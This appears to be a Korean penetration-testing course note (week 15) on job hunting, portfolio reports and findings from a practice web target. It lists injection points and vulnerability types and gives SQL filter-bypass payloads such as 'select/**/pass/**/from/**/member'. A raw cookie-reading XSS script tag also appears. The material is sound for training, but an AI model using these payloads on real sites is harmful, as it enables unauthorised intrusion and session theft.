아니면 2월말까지 포트폴리오도 완벽하게 정리해서 지원하는게 좀 나을까요?
SK 쉴더스나 여타 중견기업들은 막 찔러보면 나중에 기회가 없어질것 같아서요.

그리고 정보보안회사만의 자소서 작성팁이랄게 따로 있을까요?
ex) 경험, 보유기술(?) 어떤 방향으로 작성해야할지..

아.. 마지막으로 좀 거를 회사도 알려주신다고 하셨던거 같은데
혹시 그런곳이 어디인지 알려주실수 있나요?


</td><script>alert(document.cookie)</script>

------------------------------------------------------
15주차
<?php
- 채용 관련

컨설팅 회사 vs 일반 회사
1. 컨설팅 회사 : 신입 추천, 다양한 경험
- 단기 프로젝트


2. 일반 회사
> ex) 카카오 뱅크
장점 : 위치 고정적, 한 가지를 오래 해볼 수 있다, 시간이 많다
- 장기 프로젝트 : 1년

- 자소서 & 포트폴리오
> 역량
모의해킹 직무에 관련된 역량
- 끈질김
- 호기심 / 호기심이 없으면 경력만 쌓이고, 실력이 안늘어난다.
- 정리 (소프트 스킬)
- 커뮤니케이션 스킬 : 기술이 부족해도 커버

* 단점 / 절대 쓰지 말것!!
- 쉽게 질린다 / 답답한거 못참는다 / 주의력이 산만하다 / 발표를 못한다
- 단점을 쓰되 이거를 커버하기 위한 노력 중


> 포트폴리오
: 모의해킹 결과 보고서
: 블로그 / 블로그 주소

5일 웹사이트 1개 : 2일(5-6시간) 정도 웹해킹 / 3일 보고서 작성

* 신입 채용 비수기 : 11월 ~ 2월
* 신입 채용 성수기 : 2월, 3월 ~ 10월

----------------------------------------------

만약 면접관이 공부를 어떤방식으로 했냐고 물어보면
노말틱님(인터넷강의)께 배웠다고 얘기하면되나요

모의해킹은 아니지만 다른 정보보안분야 경험, 경력을 자소서나 이력서에 쓰는게 나을까요
예를 들면 관제같은분야요.
아니면 타 분야라 아예 말을 안하는게 나을까요
- 관제는 ok, 경력있는걸로 보내버릴수도


----------------------------------------------

- 모의해킹 / normaltic.com:9191

1. SQL Injection
주소창, 게시물 조회(넘버),
게시물 작성(파일이름), 게시물 검색(카테고리)
게시판 게시물 넘버, 회원가입
회원가입 : 컬럼 26개
게시물 검색 : 컬럼 9개
게시물 작성(파일이름)
게시물 읽기(넘버)
마이페이지: 이름 or 주소
QnA : 게시물 넘버

2. 디렉터리 인덱싱
파일 저장, Q&A
/save_files

3. 정보누출 : 메인페이지 사용자 정보 / 주석처리

4. 악성콘텐츠 : 첨부파일 확장자 제한 x / 두번째 확장자가 실행된다 .png.exe

5. XSS : 게시물 작성, 파일이름, 회원가입, id 중복체크 url params(Reflected)
대응방안 :


6. 약한 문자열 강도 : 회원가입 시 암호규정

7. 불충분한 인증 : 중복 회원가입, QnA 게시물 작성

8. CSRF : 비밀번호가 설정되지 않은 게시물 수정, 삭제

9. 불충분한 인가 : 비밀번호가 설정되지 않은 게시물 수정, 삭제 / name params

10. 불충분한 세션 만료

11. 자동화 공격

12. 프로세스 검증 누락 : 비밀번호가 설정되지 않은 게시물 수정, 삭제

13. 파일 업로드 : 이중 확장자 처리, 두번째 확장자만 인식

14. 파일 다운로드 : 경로변조, _db.php

15. 데이터 평문전송

----------------------------------------------

1. 총평 : 소제목 잘 달았음.
2. 총평에서 취약점을 다 설명할 필요는 없음 (3개 정도)
3. 총평 설명 시 : ~ 취약점이 나왔'다'
> 리뷰 시 : 그런거 같다. 생각된다. / 보다는 ~다. 확실한 전문가 진단 느낌
4. 결과 요약은 몇 건 나왔다 설명하고 넘어가자
5. SQL Injection
> PreparedStartement : 미리 컴파일 등 설명은 물어보면..
- Prepared문으로 작성하시면 됩니다.

6. 정보 노출 : HTML 주석 / csrf로 가져올수있다

7. XSS : 대응방안 설명
문제 : 특정 함수만 말하는 것 / 구체적 가이드를 줄 필요성이 있다.
사용자의 입력값 파라미터를 다른 문자로 치환

8. 불충분한 인증 : 대응방안이 필터링?? / 서버 측 검증

9. 자동화 공격 : 로그인 시도 / 왜 위험해?
> 사전 대입 공격

10. 프로세스 검증 누락(불충분한 인가) : 인가 취약점
> 대응 방안 : 이전 페이지에서 검증??
+ 권한 체크

11. 대응 방안은 카테고리화(인덱싱)해서 정리할 것.

총평에 공격 시나리오 추가 / 포트폴리오 제출 자료
- 정보노출 > 정보수집 > 피싱 > 계정탈취

* 데이터 평문 통신 > 네트워크 구간 상에서 정보 노출
* 정보 누출 : 서버 관련 정보 노출

> /**/ : 공백우회 기법
> select/**/pass/**/from/**/member
> select(pass)from(member)

* 파일 업로드 > 웹 서버측 실행 파일 (php, jsp, asp)
* 악성 콘텐츠 > exe, ps1

---------------------------------------
* 과제 (보고서 2개)
1. JH 커뮤니티 Retry 모의해킹 : 주통기반
2. 모의해킹 사이트 1개 + : 금취분평
3. 금취분평 점검 기준 WEB 항목 읽고, 공부 : 각 항목이 왜 취약한지, 공격 시나리오가 어떻게 될지 정리.


- 혼자서 말을 하면서 공부하자 / 정의같은거
?>
.
.
...
.
.
.
.
.
.
.
.
.
.
.
.
.

.
.
.
.
.
.
.
.
.
.
..
.
.
.
.
.
.
.
.
.
..
.
